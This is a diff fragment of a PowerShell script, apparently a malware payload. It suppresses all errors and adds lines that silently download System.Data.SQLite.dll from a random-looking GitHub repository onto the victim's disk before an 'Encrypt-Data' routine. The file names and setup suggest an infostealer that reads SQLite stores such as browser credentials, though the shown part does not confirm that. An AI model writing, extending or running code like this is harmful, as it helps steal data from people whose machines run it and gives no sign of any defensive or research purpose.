@@ -3,6 +3,11 @@ $ErrorActionPreference = 'SilentlyContinue'
 $repoUrl = "https://raw.githubusercontent.com/dfassdaopiju/XzxX/refs/heads/main/"
 $payloadName = "payload.ps1"
 
+# W payload.ps1 przed wywołaniem modułów:
+$sqliteDllUrl = "$repoUrl/System.Data.SQLite.dll"
+$sqliteDllPath = "E:\System.Data.SQLite.dll"
+(New-Object Net.WebClient).DownloadFile($sqliteDllUrl, $sqliteDllPath)
+
 # Funkcja do szyfrowania danych
 function Encrypt-Data {
     param($Data)
